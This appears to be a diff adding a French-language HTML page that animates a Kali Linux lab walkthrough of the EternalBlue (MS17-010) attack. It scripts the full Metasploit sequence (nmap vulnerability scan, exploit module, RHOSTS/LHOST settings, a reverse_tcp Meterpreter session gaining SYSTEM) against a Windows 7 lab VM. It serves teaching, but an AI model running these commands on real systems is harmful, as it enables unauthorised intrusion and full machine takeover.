@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kali Linux | Module d'Apprentissage EternalBlue</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --kali-blue: #2581d0;
+            --kali-dark: #1f2229;
+            --term-bg: #0c0c0c;
+            --term-text: #00ff00;
+            --text-color: #c9d1d9;
+            --accent-green: #2ea043;
+            --accent-red: #da3633;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            line-height: 1.6;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        header {
+            background-color: var(--kali-dark);
+            border-bottom: 2px solid var(--kali-blue);
+            padding: 1rem 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            z-index: 10;
+            flex-shrink: 0;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo i { color: var(--kali-blue); }
+
+        .status-bar {
+            font-size: 0.9rem;
+            color: #8b949e;
+        }
+
+        .status-badge {
+            background: #238636;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            margin-left: 10px;
+        }
+
+        main {
+            flex-grow: 1;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            padding: 20px;
+            overflow: hidden;
+            min-height: 0;
+        }
+
+        @media (max-width: 900px) {
+            main {
+                grid-template-columns: 1fr;
+                grid-template-rows: 1fr 1fr;
+                overflow-y: auto;
+            }
+        }
+
+        /* --- Section Terminal (Gauche) --- */
+        .terminal-section {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            height: 100%;
+            min-height: 0;
+        }
+
+        .window-title {
+            color: white;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-shrink: 0;
+        }
+
+        #terminal-window {
+            flex-grow: 1;
+            background-color: var(--term-bg);
+            border-radius: 6px;
+            border: 1px solid #333;
+            box-shadow: 0 0 20px rgba(37, 129, 208, 0.1);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        #term-header {
+            background: #2d2d2d;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #333;
+            flex-shrink: 0;
+        }
+
+        .dots { display: flex; gap: 6px; margin-right: 15px; }
+        .dot { width: 12px; height: 12px; border-radius: 50%; }
+        .red { background: #ff5f56; }
+        .yellow { background: #ffbd2e; }
+        .green { background: #27c93f; }
+
+        #term-title { color: #aaa; font-size: 0.8rem; flex-grow: 1; text-align: center; }
+
+        #terminal-content {
+            padding: 15px;
+            flex-grow: 1;
+            overflow-y: auto;
+            color: var(--term-text);
+            font-size: 14px;
+            white-space: pre-wrap;
+            scrollbar-width: thin;
+            scrollbar-color: #333 #0c0c0c;
+        }
+
+        /* --- Section Explications (Droite) --- */
+        .explainer-section {
+            background-color: var(--kali-dark);
+            border-radius: 6px;
+            border: 1px solid #333;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            overflow: hidden;
+            min-height: 0;
+        }
+
+        .explainer-header {
+            padding: 15px;
+            background: rgba(37, 129, 208, 0.1);
+            border-bottom: 1px solid #333;
+            color: var(--kali-blue);
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .explainer-content {
+            padding: 20px;
+            overflow-y: auto;
+            flex-grow: 1;
+            position: relative;
+            scrollbar-width: thin;
+            scrollbar-color: #444 #1f2229;
+        }
+
+        .step-card {
+            background: rgba(255,255,255,0.03);
+            border-left: 3px solid #444;
+            padding: 15px;
+            margin-bottom: 15px;
+            transition: all 0.2s ease;
+            opacity: 0.6;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            position: relative;
+        }
+
+        .step-card.active {
+            opacity: 1;
+            border-left-color: var(--kali-blue);
+            background: rgba(37, 129, 208, 0.05);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+
+        .step-card.completed {
+            opacity: 0.5;
+            border-left-color: var(--accent-green);
+        }
+
+        .step-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .step-title {
+            color: #fff;
+            font-size: 1.1rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .step-badge {
+            font-size: 0.7rem;
+            background: #333;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #aaa;
+        }
+
+        .step-desc {
+            font-size: 0.9rem;
+            color: #ccc;
+        }
+
+        .step-actions {
+            margin-top: 5px;
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .play-step-btn {
+            background: var(--kali-blue);
+            color: white;
+            border: none;
+            padding: 5px 12px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: background 0.2s;
+        }
+        
+        .play-step-btn:hover {
+            background: #1a6bb5;
+        }
+
+        .command-preview {
+            background: #000;
+            padding: 8px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            color: #dcdcdc;
+            border: 1px solid #333;
+        }
+
+        .command-preview span { color: var(--kali-blue); font-weight: bold; }
+
+        .controls {
+            padding: 15px;
+            border-top: 1px solid #333;
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            background: var(--kali-dark);
+            flex-shrink: 0;
+        }
+
+        button.main-action {
+            background: var(--accent-green);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: bold;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        button.main-action:hover { background: #238636; }
+        
+        button.secondary { 
+            background: #333; 
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: bold;
+        }
+        button.secondary:hover { background: #444; }
+
+        /* Terminal Elements */
+        .prompt { color: var(--accent-red); font-weight: bold; }
+        .path { color: #5555ff; font-weight: bold; }
+        .command { color: #ffffff; }
+        .output { color: #cccccc; }
+        .msf-prompt { text-decoration: underline; color: #5555ff; }
+        .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 15px;
+            background-color: #ccc;
+            animation: blink 1s step-end infinite;
+            vertical-align: middle;
+        }
+
+        @keyframes blink { 50% { opacity: 0; } }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-color); }
+        ::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #555; }
+
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">
+            <i class="fa-brands fa-linux"></i>
+            KALI LINUX <span style="font-weight:normal; font-size:1rem; opacity:0.8; margin-left:10px;">| Lab Virtuel : EternalBlue</span>
+        </div>
+        <div class="status-bar">
+            <span>Machine Attaquant: 192.168.56.102</span>
+            <span>Cible: 192.168.56.101 (Win7)</span>
+            <span class="status-badge">CONNECTED</span>
+        </div>
+    </header>
+
+    <main>
+        <!-- Colonne Gauche: Terminal -->
+        <section class="terminal-section">
+            <div class="window-title"><i class="fa-solid fa-terminal"></i> root@kali:~</div>
+            <div id="terminal-window">
+                <div id="term-header">
+                    <div class="dots">
+                        <div class="dot red"></div>
+                        <div class="dot yellow"></div>
+                        <div class="dot green"></div>
+                    </div>
+                    <div id="term-title">root@kali: ~</div>
+                </div>
+                <div id="terminal-content">
+                    <span id="history"></span><span class="cursor"></span>
+                </div>
+            </div>
+            
+        </section>
+
+        <!-- Colonne Droite: Explications -->
+        <section class="explainer-section">
+            <div class="explainer-header">
+                <span><i class="fa-solid fa-list-check"></i> Étapes de l'attaque</span>
+                <span id="progress-text" style="font-size:0.8rem; color:#fff;">Prêt à lancer</span>
+            </div>
+            <div class="explainer-content" id="explainer-content">
+                
+                <!-- Step 1: Recon -->
+                <div class="step-card" id="card-recon">
+                    <div class="step-header">
+                        <div class="step-title">
+                            <i class="fa-solid fa-magnifying-glass"></i> 1. Reconnaissance
+                            <span class="step-badge">NMAP</span>
+                        </div>
+                    </div>
+                    <div class="step-desc">
+                        On vérifie si le port 445 (SMB) est ouvert et si la faille MS17-010 est présente grâce au script NSE de Nmap.
+                    </div>
+                    <div class="command-preview">
+                        <span>nmap</span> --script smb-vuln-ms17-010 192.168.56.101
+                    </div>
+                    <div class="step-actions">
+                        <button class="play-step-btn" onclick="runSingleStage('card-recon')">
+                            <i class="fa-solid fa-play"></i> Lancer cette étape
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Step 2: Init -->
+                <div class="step-card" id="card-init">
+                    <div class="step-header">
+                        <div class="step-title">
+                            <i class="fa-brands fa-searchengin"></i> 2. Initialisation
+                            <span class="step-badge">METASPLOIT</span>
+                        </div>
+                    </div>
+                    <div class="step-desc">
+                        Lancement du framework Metasploit et sélection du module d'attaque spécifique "EternalBlue" développé par la NSA.
+                    </div>
+                    <div class="command-preview">
+                        <span>use</span> exploit/windows/smb/ms17_010_eternalblue
+                    </div>
+                    <div class="step-actions">
+                        <button class="play-step-btn" onclick="runSingleStage('card-init')">
+                            <i class="fa-solid fa-play"></i> Lancer cette étape
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Step 3: Config -->
+                <div class="step-card" id="card-config">
+                    <div class="step-header">
+                        <div class="step-title">
+                            <i class="fa-solid fa-sliders"></i> 3. Configuration
+                            <span class="step-badge">OPTIONS</span>
+                        </div>
+                    </div>
+                    <div class="step-desc">
+                        Définition des cibles :
+                        <br>• <strong>RHOSTS</strong> (Remote) : L'IP de la victime (Win7).
+                        <br>• <strong>LHOST</strong> (Local) : Notre IP (Kali) pour recevoir la connexion retour.
+                    </div>
+                    <div class="command-preview">
+                        <span>set</span> RHOSTS 192.168.56.101
+                    </div>
+                    <div class="step-actions">
+                        <button class="play-step-btn" onclick="runSingleStage('card-config')">
+                            <i class="fa-solid fa-play"></i> Lancer cette étape
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Step 4: Attack -->
+                <div class="step-card" id="card-attack">
+                    <div class="step-header">
+                        <div class="step-title">
+                            <i class="fa-solid fa-bomb"></i> 4. Exploitation
+                            <span class="step-badge">EXPLOIT</span>
+                        </div>
+                    </div>
+                    <div class="step-desc">
+                        Envoi de paquets SMB malformés pour corrompre la mémoire du noyau Windows (Buffer Overflow) et exécuter notre code.
+                    </div>
+                    <div class="command-preview">
+                        <span>exploit</span>
+                    </div>
+                    <div class="step-actions">
+                        <button class="play-step-btn" onclick="runSingleStage('card-attack')">
+                            <i class="fa-solid fa-play"></i> Lancer cette étape
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Step 5: Post-Exploit -->
+                <div class="step-card" id="card-post">
+                    <div class="step-header">
+                        <div class="step-title">
+                            <i class="fa-solid fa-crown"></i> 5. Post-Exploitation
+                            <span class="step-badge">SYSTEM</span>
+                        </div>
+                    </div>
+                    <div class="step-desc">
+                        Succès ! Une session <strong>Meterpreter</strong> est ouverte. Nous avons les droits "SYSTEM" (supérieurs à Administrateur).
+                    </div>
+                    <div class="command-preview">
+                        <span>getuid</span> -> NT AUTHORITY\SYSTEM
+                    </div>
+                    <div class="step-actions">
+                        <button class="play-step-btn" onclick="runSingleStage('card-post')">
+                            <i class="fa-solid fa-play"></i> Lancer cette étape
+                        </button>
+                    </div>
+                </div>
+
+            </div>
+            <div class="controls">
+                <button class="main-action" onclick="runFullSimulation()"><i class="fa-solid fa-rocket"></i> Lancer Procédure Complète</button>
+                <button class="secondary" onclick="clearTerm()"><i class="fa-solid fa-trash"></i> Reset</button>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        const historyElement = document.getElementById('history');
+        const terminalContent = document.getElementById('terminal-content');
+        const progressText = document.getElementById('progress-text');
+        
+        let stopSimulation = false;
+
+        const steps = [
+            {
+                type: 'command',
+                stage: 'card-recon',
+                text: 'nmap -Pn -p 445 --script smb-vuln-ms17-010 192.168.56.101',
+                delay: 50
+            },
+            {
+                type: 'output',
+                stage: 'card-recon',
+                text: `Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-25 10:00 CET
+Nmap scan report for 192.168.56.101
+Host is up (0.00045s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|_    Description: This exploit allows remote code execution...
+
+Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds
+`,
+                delay: 1500
+            },
+            {
+                type: 'command',
+                stage: 'card-init',
+                text: 'msfconsole -q',
+                delay: 800
+            },
+            {
+                type: 'output',
+                stage: 'card-init',
+                text: `
+       =[ metasploit v6.1.27-dev                          ]
++ -- --=[ 2196 exploits - 1162 auxiliary - 400 post       ]
++ -- --=[ 596 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Use the 'save' command to save your current configuration
+`,
+                delay: 1000,
+                promptChange: 'msf6 > '
+            },
+            {
+                type: 'command',
+                stage: 'card-init',
+                text: 'use exploit/windows/smb/ms17_010_eternalblue',
+                delay: 600,
+                prompt: 'msf6 > '
+            },
+            {
+                type: 'output',
+                stage: 'card-init',
+                text: '[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\n',
+                delay: 500,
+                promptChange: 'msf6 exploit(windows/smb/ms17_010_eternalblue) > '
+            },
+            {
+                type: 'command',
+                stage: 'card-config',
+                text: 'set RHOSTS 192.168.56.101',
+                delay: 600,
+                prompt: 'msf6 exploit(windows/smb/ms17_010_eternalblue) > '
+            },
+            {
+                type: 'output',
+                stage: 'card-config',
+                text: 'RHOSTS => 192.168.56.101\n',
+                delay: 300
+            },
+            {
+                type: 'command',
+                stage: 'card-config',
+                text: 'set LHOST 192.168.56.102',
+                delay: 600,
+                prompt: 'msf6 exploit(windows/smb/ms17_010_eternalblue) > '
+            },
+            {
+                type: 'output',
+                stage: 'card-config',
+                text: 'LHOST => 192.168.56.102\n',
+                delay: 300
+            },
+            {
+                type: 'command',
+                stage: 'card-attack',
+                text: 'exploit',
+                delay: 800,
+                prompt: 'msf6 exploit(windows/smb/ms17_010_eternalblue) > '
+            },
+            {
+                type: 'output',
+                stage: 'card-attack',
+                text: `[*] Started reverse TCP handler on 192.168.56.102:4444 
+[*] 192.168.56.101:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.56.101:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.56.101:445 - Scanned 1 of 1 hosts (100% complete)
+[*] 192.168.56.101:445 - Connecting to target for exploitation.
+[+] 192.168.56.101:445 - Connection established for exploitation.
+[+] 192.168.56.101:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.56.101:445 - CORE raw buffer dump (42 bytes)
+[*] 192.168.56.101:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 192.168.56.101:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 192.168.56.101:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 192.168.56.101:445 - Target arch selected valid for arch indicated by DCS reply
+[*] 192.168.56.101:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.56.101:445 - Sending all but last fragment of exploit packet
+[*] 192.168.56.101:445 - Starting non-paged pool grooming
+[+] 192.168.56.101:445 - Sending SMBv2 buffers
+[+] 192.168.56.101:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.56.101:445 - Sending final SMBv2 buffers.
+[*] 192.168.56.101:445 - Sending last fragment of exploit packet!
+[*] 192.168.56.101:445 - Receiving response from exploit packet
+[+] 192.168.56.101:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.56.101:445 - Sending egg to locate shellcode.
+[+] 192.168.56.101:445 - Forged process fields successfully overwritten
+[*] 192.168.56.101:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200262 bytes) to 192.168.56.101
+[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.101:49158) at 2023-10-25 10:01:23 +0100
+`,
+                delay: 3000,
+                promptChange: 'meterpreter > '
+            },
+            {
+                type: 'command',
+                stage: 'card-post',
+                text: 'sysinfo',
+                delay: 800,
+                prompt: 'meterpreter > '
+            },
+            {
+                type: 'output',
+                stage: 'card-post',
+                text: `Computer        : WIN7-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : fr_FR
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+`,
+                delay: 1000
+            },
+            {
+                type: 'command',
+                stage: 'card-post',
+                text: 'getuid',
+                delay: 800,
+                prompt: 'meterpreter > '
+            },
+            {
+                type: 'output',
+                stage: 'card-post',
+                text: 'Server username: NT AUTHORITY\\SYSTEM\n',
+                delay: 1000
+            },
+             {
+                type: 'output',
+                stage: 'card-post',
+                text: '\n--- FIN DE LA PROCÉDURE ---',
+                delay: 0
+            }
+        ];
+
+        function activateStage(stageId, autoScroll = false) {
+            document.querySelectorAll('.step-card').forEach(c => {
+                if(c.classList.contains('active')) {
+                    c.classList.remove('active');
+                    c.classList.add('completed');
+                }
+            });
+            
+            const card = document.getElementById(stageId);
+            if(card) {
+                card.classList.add('active');
+                card.classList.remove('completed');
+                
+                // On scroll SEULEMENT si c'est la procédure automatique complète
+                // Si c'est manuel, l'utilisateur a cliqué sur le bouton donc il voit déjà la carte
+                if(autoScroll) {
+                    const container = document.getElementById('explainer-content');
+                    const scrollPos = card.offsetTop - (container.clientHeight / 2) + (card.clientHeight / 2);
+                    container.scrollTo({ top: scrollPos, behavior: 'smooth' });
+                }
+                
+                progressText.textContent = "Exécution : " + card.querySelector('.step-title').innerText;
+            }
+        }
+
+        async function typeText(text, element, instant = false) {
+            if (instant) {
+                element.innerHTML += text;
+                terminalContent.scrollTop = terminalContent.scrollHeight;
+                return;
+            }
+            for (let char of text) {
+                if (stopSimulation) return;
+                element.innerHTML += char;
+                terminalContent.scrollTop = terminalContent.scrollHeight;
+                await new Promise(r => setTimeout(r, Math.random() * 30 + 10)); 
+            }
+        }
+
+        // Lancement d'une étape unique (avec rattrapage instantané des précédentes)
+        async function runSingleStage(stageId) {
+            stopSimulation = true;
+            await new Promise(r => setTimeout(r, 50)); // Safety delay
+
+            // Trouver l'index de début de l'étape demandée
+            let startIndex = steps.findIndex(step => step.stage === stageId);
+            if (startIndex === -1) startIndex = 0;
+
+            // Trouver l'index de fin (la prochaine étape ou la fin du tableau)
+            // On cherche le prochain élément qui a un 'stage' différent de l'actuel
+            let endIndex = steps.length;
+            for(let i = startIndex + 1; i < steps.length; i++) {
+                if(steps[i].stage && steps[i].stage !== stageId) {
+                    endIndex = i;
+                    break;
+                }
+            }
+
+            runSimulation(startIndex, endIndex, false); // false = pas d'autoscroll
+        }
+
+        // Lancement de tout
+        async function runFullSimulation() {
+            stopSimulation = true;
+            await new Promise(r => setTimeout(r, 50));
+            runSimulation(0, steps.length, true); // true = autoscroll activé
+        }
+
+        async function runSimulation(startIndex, endIndex, isAutoScroll) {
+            clearTerm(false); 
+            stopSimulation = false;
+            let currentPrompt = '<span class="prompt">root</span><span class="command">@</span><span class="prompt">kali</span>:<span class="path">~</span><span class="command">#</span> ';
+
+            // Reset visuals
+            document.querySelectorAll('.step-card').forEach(c => {
+                c.classList.remove('active', 'completed');
+            });
+
+            // Boucle principale
+            for (let i = 0; i < endIndex; i++) {
+                if (stopSimulation) break;
+
+                let step = steps[i];
+                let isInstant = i < startIndex; // Instantané pour tout ce qui précède la sélection
+
+                // Gestion des cartes actives
+                if (step.stage) {
+                    if (!isInstant) {
+                        // Si c'est le moment de jouer l'étape (temps réel)
+                        activateStage(step.stage, isAutoScroll);
+                    } else if (i === startIndex - 1 || (i < startIndex && i > 0 && steps[i-1].stage !== step.stage)) {
+                        // Marquer comme complété si on passe dessus en instantané
+                         const card = document.getElementById(step.stage);
+                         if(card) card.classList.add('completed');
+                    }
+                }
+                
+                // Si on démarre directement une étape avancée, on marque la carte courante comme active immédiatement
+                if (i === startIndex && step.stage) {
+                     activateStage(step.stage, isAutoScroll);
+                }
+
+                // Gestion du Prompt
+                if (step.prompt) {
+                     if (step.prompt.includes('msf')) {
+                         currentPrompt = `<span class="msf-prompt">${step.prompt}</span>`;
+                     } else if (step.prompt.includes('meterpreter')) {
+                         currentPrompt = `<span class="prompt">${step.prompt}</span>`;
+                     }
+                }
+
+                // Affichage Commande / Output
+                if (step.type === 'command') {
+                    const line = document.createElement('div');
+                    line.innerHTML = currentPrompt;
+                    historyElement.appendChild(line);
+                    
+                    const commandSpan = document.createElement('span');
+                    commandSpan.className = 'command';
+                    line.appendChild(commandSpan);
+                    
+                    await typeText(step.text, commandSpan, isInstant);
+                    
+                    if (!isInstant) await new Promise(r => setTimeout(r, 300));
+
+                } else if (step.type === 'output') {
+                    const outputDiv = document.createElement('div');
+                    outputDiv.className = 'output';
+                    outputDiv.textContent = step.text;
+                    historyElement.appendChild(outputDiv);
+                }
+
+                terminalContent.scrollTop = terminalContent.scrollHeight;
+                
+                // Délai seulement si ce n'est pas instantané
+                if (!isInstant) {
+                    await new Promise(r => setTimeout(r, step.delay));
+                }
+            }
+            
+            if(!stopSimulation) {
+                progressText.textContent = "Terminé.";
+            }
+        }
+
+        function clearTerm(resetStatus = true) {
+            stopSimulation = true;
+            historyElement.innerHTML = '';
+            document.querySelectorAll('.step-card').forEach(c => {
+                c.classList.remove('active', 'completed');
+            });
+            if(resetStatus) progressText.textContent = "Prêt.";
+        }
+
+    </script>
+</body>
+</html>
